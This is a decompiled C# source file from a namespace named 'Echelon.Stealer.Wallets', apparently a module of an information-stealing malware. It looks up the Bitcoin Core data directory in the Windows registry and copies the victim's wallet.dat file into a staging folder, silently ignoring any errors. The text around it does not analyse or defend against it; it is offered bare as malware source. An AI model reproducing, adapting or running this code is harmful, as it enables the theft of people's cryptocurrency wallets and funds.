using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000006 RID: 6
	internal class BitcoinCore
	{
		// Token: 0x0600000C RID: 12 RVA: 0x00003088 File Offset: 0x00001288
		public static void BCStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
						BitcoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000011 RID: 17
		public static int count;
	}
}
